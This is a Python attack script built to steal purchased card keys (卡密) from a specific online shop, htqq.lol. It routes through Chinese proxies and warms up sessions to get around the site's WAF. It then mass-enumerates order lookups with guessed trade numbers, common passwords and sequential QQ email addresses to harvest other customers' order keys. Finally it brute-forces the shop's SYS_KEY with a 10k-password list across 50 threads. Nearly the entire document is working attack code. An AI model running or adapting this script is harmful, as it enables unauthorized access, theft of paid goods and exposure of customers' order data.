#!/usr/bin/env python3
"""htqq.lol 卡密抓取 v12 — CN 代理出口，并行 tradeno/联系方式/SYS_KEY."""
from __future__ import annotations

import concurrent.futures
import hashlib
import itertools
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

BASE = "https://htqq.lol/shop"
OUT = Path(os.environ.get("OUT", f"/tmp/htqq_cap_v12_{int(time.time())}"))
OUT.mkdir(parents=True, exist_ok=True)
CK = str(OUT / "cookies.jar")


def get_proxy() -> str:
    subprocess.run(
        ["/data/automation/bin/qg-proxy-fetch.sh"],
        capture_output=True,
        text=True,
    )
    env_file = Path("/data/config/proxy.env")
    if env_file.exists():
        for line in env_file.read_text().splitlines():
            if line.startswith("PROXY_URL="):
                return line.split("=", 1)[1].strip()
    return os.environ.get("PROXY_URL", "")


PX = get_proxy()


def curl(url: str, data: str | None = None, referer: str | None = None, xhr: bool = False) -> str:
    cmd = [
        "curl", "-sk", "--max-time", "20", "-x", PX, "-c", CK, "-b", CK,
        "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "-H", "Accept-Language: zh-CN,zh;q=0.9",
    ]
    if referer:
        cmd += ["-H", f"Referer: {referer}"]
    if xhr:
        cmd += ["-H", "X-Requested-With: XMLHttpRequest"]
    if data is not None:
        cmd += ["-X", "POST", "-d", data]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def waf_warmup() -> bool:
    """v9: 先访问 shop 首页 + buy 页，绕过 _guard 滑块。"""
    for attempt in range(5):
        home = curl(f"{BASE}/", referer="https://htqq.lol/")
        if "_guard" in home[:300]:
            log(f"waf warmup attempt {attempt+1}: home blocked")
            time.sleep(2)
            continue
        buy = curl(f"{BASE}/?mod=buy&cid=2&tid=2", referer=f"{BASE}/?mod=buy&cid=2&tid=2")
        if len(buy) > 5000 and "_guard" not in buy[:300]:
            log(f"waf warmup ok buy_len={len(buy)}")
            return True
        log(f"waf warmup attempt {attempt+1}: buy_len={len(buy)}")
        time.sleep(2)
    return False


def curl_json(url: str, referer: str | None = None, xhr: bool = True) -> dict | None:
    for _ in range(3):
        body = curl(url, referer=referer, xhr=xhr)
        if body.strip().startswith("{"):
            try:
                return json.loads(body)
            except json.JSONDecodeError:
                pass
        if "_guard" in body[:200]:
            waf_warmup()
        time.sleep(1)
    return None


def log(msg: str) -> None:
    print(msg, flush=True)
    with open(OUT / "log.txt", "a") as f:
        f.write(msg + "\n")


SHOW_ORDER = re.compile(r"showOrder\((\d+),\s*'([^']+)'\)")


def main() -> int:
    log(f"proxy={PX[:50]}... out={OUT}")

    if not waf_warmup():
        log("ERROR: WAF warmup failed")
        return 3

    gc = curl_json(f"{BASE}/ajax.php?act=getcount", referer=f"{BASE}/")
    if not gc:
        log("ERROR: getcount failed after warmup")
        return 3
    orders = int(gc["orders"])
    log(f"orders={orders} paid={gc.get('orders1')}")

    # 下单（验证会话链）
    ref = f"{BASE}/?mod=buy&cid=2&tid=2"
    html = curl(ref, referer=ref)
    m_csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', html)
    m_hs = re.search(r"var hashsalt=([^;]+);", html)
    trade = ""
    if m_csrf and m_hs:
        csrf = m_csrf.group(1)
        hs = subprocess.check_output(
            ["node", "-e", f"var hashsalt={m_hs.group(1)}; console.log(hashsalt)"],
            text=True,
        ).strip()
        pay_raw = curl(
            f"{BASE}/ajax.php?act=pay",
            data=f"tid=2&num=1&inputvalue=v12cap&hashsalt={hs}&csrf_token={csrf}",
            referer=ref,
            xhr=True,
        )
        log(f"pay={pay_raw[:250]}")
        try:
            trade = json.loads(pay_raw).get("trade_no", "")
        except json.JSONDecodeError:
            pass

    hits: list[tuple[str, str]] = []

    # HTML 查询
    for q in filter(None, [trade, "v12cap", "123456", "888888", "12345678", "a123456"]):
        body = curl(f"{BASE}/?mod=query&data={q}", referer=f"{BASE}/?mod=query")
        for m in SHOW_ORDER.finditer(body):
            hits.append((m.group(1), m.group(2)))
            log(f"HTML HIT q={q} id={m.group(1)} skey={m.group(2)}")

    # tradeno 扫描 — 格式 YYYYMMDDHHMMSS + 3位序号 = 17位
    prefix = time.strftime("%Y%m%d")
    tns: list[str] = []
    for h in range(24):
        for m in range(0, 60, 2):
            for s in (0, 15, 30, 45):
                for suf in ("153", "128", "492", "837", "392", "742", "858", "825", "001", "053", "481", "631", "077", "428", "768", "387"):
                    tn = f"{prefix}{h:02d}{m:02d}{s:02d}{suf}"
                    if len(tn) == 17:
                        tns.append(tn)
    tns = list(dict.fromkeys(tns))[:3500]

    def scan_tn(tn: str) -> tuple[str, list[tuple[str, str]]] | None:
        time.sleep(0.04)
        body = curl(f"{BASE}/?mod=query&data={tn}", referer=f"{BASE}/?mod=query")
        m = SHOW_ORDER.findall(body)
        return (tn, m) if m else None

    log(f"tradeno scan n={len(tns)}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for res in ex.map(scan_tn, tns):
            if res:
                tn, m = res
                log(f"TRADENO HIT {tn} => {m}")
                hits.extend(m)

    # 联系方式
    contacts = [f"{i}@qq.com" for i in range(10000, 11000)]
    contacts += [
        "123456", "888888", "666666", "a123456", "qq123456", "5201314",
        "wx", "test@test.com", "13800138000", "18888888888",
    ]
    log(f"contact scan n={len(contacts)}")
    for c in contacts:
        body = curl(f"{BASE}/?mod=query&data={c}", referer=f"{BASE}/?mod=query")
        m = SHOW_ORDER.findall(body)
        if m:
            log(f"CONTACT HIT {c} => {m}")
            hits.extend(m)
        time.sleep(0.06)

    # 取 kminfo
    card: str | None = None
    seen: set[tuple[str, str]] = set()
    for oid, sk in hits:
        key = (oid, sk)
        if key in seen:
            continue
        seen.add(key)
        body = curl(
            f"{BASE}/ajax.php?act=order",
            data=f"id={oid}&skey={sk}",
            referer=f"{BASE}/?mod=query",
            xhr=True,
        )
        log(f"ORDER {oid} => {body[:400]}")
        if "kminfo" in body or '"code":0' in body:
            card = body
            (OUT / "CARD.json").write_text(body)
            (OUT / "HIT.txt").write_text(f"id={oid} skey={sk}\n{body}")
            break

    # SYS_KEY 爆破
    if not card:
        log("SYS_KEY brute start")
        words_raw = subprocess.check_output(
            [
                "curl", "-fsSL",
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
            ],
            text=True,
        ).splitlines()
        extra = [
            "htqq", "htqq.lol", "faka", "rainbow", "caihong", "dujiaoka",
            "345a36b5fa7be2bdd2f1724157952938", "b0750180cd456b7d6efc2217f10226dd",
            "674", "18061", "5814059", "18609", "htqq2026", "serSqW8TgxC2wAS",
        ]
        words = list(dict.fromkeys(extra + [w.strip() for w in words_raw if w.strip()]))
        ids = list(range(orders - 500, orders + 1))

        def brute(pair: tuple[int, str]) -> tuple[int, str, str] | None:
            oid, w = pair
            sk = hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest()
            body = curl(
                f"{BASE}/ajax.php?act=order",
                data=f"id={oid}&skey={sk}",
                referer=f"{BASE}/?mod=query",
                xhr=True,
            )
            if '"code":0' in body or "kminfo" in body:
                return oid, w, body
            return None

        pairs = list(itertools.product(ids, words))
        log(f"brute pairs={len(pairs)}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
            for i, res in enumerate(ex.map(brute, pairs, chunksize=400)):
                if res:
                    log(f"SYS_KEY HIT id={res[0]} key={res[1]!r}")
                    card = res[2]
                    (OUT / "CARD.json").write_text(card)
                    (OUT / "HIT.txt").write_text(str(res))
                    ex.shutdown(cancel_futures=True)
                    break
                if i and i % 50000 == 0:
                    log(f"brute progress {i}")

    log(f"DONE card={'YES' if card else 'NO'} html_hits={len(seen)}")
    return 0 if card else 2


if __name__ == "__main__":
    sys.exit(main())
